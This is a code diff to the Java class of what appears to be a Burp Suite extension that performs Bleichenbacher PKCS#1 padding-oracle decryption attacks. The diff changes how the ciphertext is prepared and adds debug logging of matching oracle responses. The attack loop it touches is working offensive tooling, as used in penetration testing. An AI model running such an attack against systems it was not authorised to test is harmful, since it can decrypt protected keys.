@@ -166,6 +166,8 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         IHttpRequestResponse response;
         byte[] request;
 
+        BigInteger ciphered = new BigInteger(1, this.encryptedKey);
+
         do {
             // Check if user has cancelled the worker
             if (isCancelled()) {
@@ -174,7 +176,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
             }
 
             this.si = this.si.add( BigInteger.ONE );
-            send = prepareMsg( this.c0, this.si );
+            send = prepareMsg(ciphered, this.si);
 
             request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getValue());
@@ -257,7 +259,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
             updateAmountRequest();
 
         } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
-
+        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
     }
 
 
@@ -291,7 +293,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
             updateAmountRequest();
 
         } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
-
+        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
     }
 
     private void stepTwoC() throws Exception {
@@ -347,7 +349,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
             updateAmountRequest();
 
         } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
-
+        loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
     }
 
     private BigInteger step2cComputeLowerBound( final BigInteger r, final BigInteger modulus, final BigInteger upperIntervalBound ) {
